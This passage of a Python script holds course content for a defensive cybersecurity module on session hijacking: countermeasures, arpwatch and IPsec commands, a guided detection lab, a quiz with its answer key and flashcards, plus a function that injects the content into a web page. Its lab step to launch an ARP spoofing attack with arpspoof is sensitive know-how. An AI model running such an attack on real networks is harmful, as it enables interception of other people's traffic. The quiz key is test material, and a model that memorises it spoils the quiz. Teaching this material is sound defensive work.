            'gfs': 'At Global Financial Services, the SOC uses advanced Endpoint Detection and Response (EDR) and network sensors to detect ARP spoofing tools in real-time, preventing network-level hijacking.',
            'windows': 'Windows environments leverage Group Policy to enforce IPsec for internal communications and require SMB signing to prevent SMB relay and hijacking attacks.',
            'linux': 'Linux infrastructure relies on SSH key-based authentication, strict firewall rules, and tools like ARPwatch to monitor network integrity and prevent hijacking.'
        },
        'workflow': [
            'Step 1: Conduct vulnerability assessments to identify weak session management.',
            'Step 2: Enforce HTTPS (TLS) across all web applications.',
            'Step 3: Implement secure cookie attributes (HttpOnly, Secure, SameSite).',
            'Step 4: Configure network switches with Port Security and Dynamic ARP Inspection (DAI).',
            'Step 5: Deploy Network Intrusion Detection Systems (NIDS) to monitor for ARP anomalies.',
            'Step 6: Regularly audit logs for multiple logins from different IPs using the same session ID.'
        ],
        'diagram': {
            'caption': 'Click to interact with the diagram',
            'svg': '<svg viewBox="0 0 600 400" xmlns="http://www.w3.org/2000/svg"><rect x="50" y="50" width="150" height="300" fill="#e0f7fa" rx="10"/><text x="125" y="80" dominant-baseline="middle" text-anchor="middle" font-weight="bold">Offensive Tools</text><text x="125" y="120" text-anchor="middle">Ettercap</text><text x="125" y="160" text-anchor="middle">Bettercap</text><text x="125" y="200" text-anchor="middle">Wireshark</text><text x="125" y="240" text-anchor="middle">Burp Suite</text><rect x="400" y="50" width="150" height="300" fill="#e8f5e9" rx="10"/><text x="475" y="80" dominant-baseline="middle" text-anchor="middle" font-weight="bold">Defenses</text><text x="475" y="120" text-anchor="middle">TLS / HTTPS</text><text x="475" y="160" text-anchor="middle">IPsec</text><text x="475" y="200" text-anchor="middle">Secure Cookies</text><text x="475" y="240" text-anchor="middle">ARP Inspection (DAI)</text><text x="475" y="280" text-anchor="middle">IDS / IPS</text><path d="M 210 120 L 390 120" stroke="gray" stroke-width="2" stroke-dasharray="5,5" marker-end="url(#arrow)"/></svg>'
        },
        'commands': {
            'lin': [
                { 'cmd': 'arpwatch -i eth0', 'purpose': 'Monitor ARP activity and detect spoofing.', 'out': 'Alerts in syslog', 'note': 'Useful for detecting network hijacking prep', 'mistake': 'Ignoring alerts in dynamic DHCP environments' }
            ],
            'win': [
                { 'cmd': 'Get-NetIPsecMainModeSA', 'purpose': 'View active IPsec security associations.', 'out': 'Active IPsec connections', 'note': 'Verifies encryption is active', 'mistake': 'Assuming IPsec is enabled without checking' }
            ]
        },
        'lab': {
            'type': 'guided',
            'difficulty': 'Intermediate',
            'duration': '40',
            'platform': 'Kali Linux',
            'environment': 'Local Lab',
            'tools': ['Arpwatch', 'Wireshark'],
            'dependencies': [],
            'safety': ['Perform this lab only in an isolated environment.'],
            'scenario': 'Detect an ongoing ARP spoofing attack simulating a network hijacking attempt.',
            'objectives': ['Configure Arpwatch to monitor the network.', 'Simulate an ARP spoofing attack.', 'Analyze the alerts generated by Arpwatch.'],
            'steps': [
                'Step 1: Install and start Arpwatch on the defending machine: `sudo systemctl start arpwatch`.',
                'Step 2: On a separate attacker VM, launch an ARP spoofing attack using `arpspoof`.',
                'Step 3: On the defending machine, monitor the syslog: `tail -f /var/log/syslog | grep arpwatch`.',
                'Step 4: Observe the "flip flop" or "changed ethernet address" alerts.',
                'Step 5: Use Wireshark to inspect the excessive ARP replies.'
            ],
            'evidence': ['Screenshot of the Arpwatch alerts in syslog.', 'Screenshot of excessive ARP traffic in Wireshark.'],
            'validation': ['You should see clear alerts indicating that a MAC address for a specific IP has changed.'],
            'troubleshooting': ['If no alerts appear, ensure Arpwatch is listening on the correct interface.'],
            'mitre': [{ 'id': 'T1040', 'name': 'Network Sniffing', 'tactic': 'Credential Access' }],
            'cleanup': ['Stop the ARP spoofing attack and stop the Arpwatch service.']
        },
        'quiz': [
            {
                'type': 'multiple-choice',
                'difficulty': 'Intermediate',
                'q': 'Which tool is widely used for automated ARP spoofing and Man-in-the-Middle attacks?',
                'opts': ['Nmap', 'Ettercap', 'Hashcat', 'John the Ripper'],
                'correct': 1,
                'fb': 'Ettercap is a comprehensive suite for MitM attacks, featuring sniffing of live connections, content filtering on the fly, and many other interesting tricks.'
            },
            {
                'type': 'multiple-choice',
                'difficulty': 'Intermediate',
                'q': 'What is a primary defense against application-level session hijacking?',
                'opts': ['Dynamic ARP Inspection (DAI)', 'Port Security', 'Enforcing HTTPS and secure cookie attributes', 'Disabling ICMP'],
                'correct': 2,
                'fb': 'HTTPS prevents sniffing, and secure cookie attributes (HttpOnly, Secure) prevent client-side script access and unencrypted transmission.'
            },
            {
                'type': 'multiple-choice',
                'difficulty': 'Hard',
                'q': 'How does Dynamic ARP Inspection (DAI) mitigate network-level hijacking?',
                'opts': ['By encrypting ARP packets', 'By validating ARP packets against a trusted database (like DHCP snooping bindings) and dropping invalid ones', 'By disabling the ARP protocol entirely', 'By hiding MAC addresses'],
                'correct': 1,
                'fb': 'DAI is a security feature on switches that validates ARP packets in a network. It drops ARP packets with invalid IP-to-MAC address bindings.'
            },
            {
                'type': 'multiple-choice',
                'difficulty': 'Intermediate',
                'q': 'Which tool can be used defensively to alert administrators of ARP spoofing?',
                'opts': ['Metasploit', 'Arpwatch', 'Aircrack-ng', 'Sqlmap'],
                'correct': 1,
                'fb': 'Arpwatch is a computer software tool for monitoring Address Resolution Protocol (ARP) traffic on a computer network, alerting on changes to IP-MAC mappings.'
            },
            {
                'type': 'true-false',
                'difficulty': 'Easy',
                'q': 'Using an Intrusion Detection System (IDS) can completely prevent session hijacking.',
                'opts': ['True', 'False'],
                'correct': 1,
                'fb': 'False. An IDS only *detects* malicious activity and alerts administrators. An IPS (Intrusion Prevention System) can attempt to block it, but prevention requires secure coding and encryption.'
            },
            {
                'type': 'multiple-choice',
                'difficulty': 'Intermediate',
                'q': 'What is the purpose of the "SameSite" cookie attribute?',
                'opts': ['To ensure cookies are only sent over HTTPS', 'To prevent client-side scripts from reading the cookie', 'To control whether cookies are sent with cross-site requests, mitigating CSRF', 'To encrypt the cookie data'],
                'correct': 2,
                'fb': 'SameSite allows servers to assert that a cookie ought not to be sent along with cross-site requests, providing protection against CSRF.'
            },
            {
                'type': 'multiple-choice',
                'difficulty': 'Hard',
                'q': 'Why should session tokens be tied to the client\'s IP address with caution?',
                'opts': ['It makes the application slower.', 'Legitimate users\' IP addresses may change during a session (e.g., switching from Wi-Fi to cellular data), causing accidental logouts.', 'It is illegal in some jurisdictions.', 'IP addresses cannot be read by web servers.'],
                'correct': 1,
                'fb': 'While tying a session to an IP address can detect hijacking (if the attacker has a different IP), it causes usability issues for mobile users whose IPs frequently change.'
            },
            {
                'type': 'multiple-choice',
                'difficulty': 'Intermediate',
                'q': 'When should a web application regenerate a session ID?',
                'opts': ['Every 5 minutes', 'Only when the user logs out', 'After successful authentication or privilege escalation', 'Every time a new page is loaded'],
                'correct': 2,
                'fb': 'Regenerating the session ID after login prevents Session Fixation attacks, as any pre-existing session ID becomes invalid once authenticated.'
            },
            {
                'type': 'true-false',
                'difficulty': 'Intermediate',
                'q': 'Implementing IPsec entirely eliminates the risk of application-level session hijacking.',
                'opts': ['True', 'False'],
                'correct': 1,
                'fb': 'False. IPsec encrypts network traffic, preventing network-level sniffing. However, application-level vulnerabilities like XSS can still be used to steal cookies from the browser endpoint.'
            },
            {
                'type': 'multiple-choice',
                'difficulty': 'Intermediate',
                'q': 'Which of the following represents a secure session management practice?',
                'opts': ['Passing session IDs in the URL (GET parameters)', 'Storing session IDs in Local Storage instead of cookies', 'Implementing absolute and idle session timeouts', 'Using easily guessable sequential session IDs'],
                'correct': 2,
                'fb': 'Implementing timeouts ensures that if a user forgets to log out, the session will eventually expire, reducing the window of opportunity for an attacker.'
            }
        ],
        'flashcards': [
            { 'f': 'Dynamic ARP Inspection (DAI)', 'b': 'A network switch feature that prevents ARP spoofing by validating ARP packets.' },
            { 'f': 'Arpwatch', 'b': 'A tool that monitors ARP traffic and alerts on changes in IP-to-MAC address pairings.' },
            { 'f': 'Session Timeout', 'b': 'A countermeasure where sessions automatically expire after a period of inactivity.' },
            { 'f': 'Session Regeneration', 'b': 'The practice of issuing a new session ID after a user successfully authenticates.' }
        ],
        'summary': [
            'Offensive tools like Ettercap and Bettercap automate network-level hijacking attacks.',
            'Defensive tools like Arpwatch and IDS/IPS help detect hijacking activity.',
            'Strong encryption (IPsec, TLS) is essential for preventing network-level interception.',
            'Secure application coding (HttpOnly, Secure flags, session regeneration) prevents application-level hijacking.',
            'A defense-in-depth approach is required, combining network and application security controls.'
        ],
        'outcomes': [
            'List common tools used for session hijacking and sniffing.',
            'Configure network defenses like DAI and Arpwatch.',
            'Implement comprehensive session management countermeasures in web applications.'
        ],
        'meta': {
            'contentVersion': '1.0.0',
            'estimatedTime': 45,
            'difficulty': 'Intermediate',
            'prerequisites': ['Session Hijacking Concepts', 'Network Security'],
            'lastReviewed': '2026-07-18'
        }
    }
}

import re

def update_html():
    base_dir = os.path.dirname(os.path.abspath(__file__))
    file_path = os.path.join(base_dir, "frontend", "index.html")
    
    with open(file_path, "r", encoding="utf-8") as f:
        html = f.read()
    
    js_injection = "\\n\\n// --- INJECTED MODULE 11 CONTENT ---\\n"
    for topic_id, data in content.items():
        js_injection += f"CONTENT['{topic_id}'] = {json.dumps(data, indent=2)};\\n"
    js_injection += "\\n// --- END INJECTED MODULE 11 CONTENT ---\\n\\n"
    
    marker = "// ── TAB WIRING ──"
    if marker in html:
        html = html.replace(marker, js_injection + marker)
        with open(file_path, "w", encoding="utf-8") as f:
            f.write(html)
        print(f"Successfully injected Module 11 content into {file_path}")
    else:
        print(f"Error: Marker '{marker}' not found in {file_path}")

if __name__ == "__main__":
    update_html()
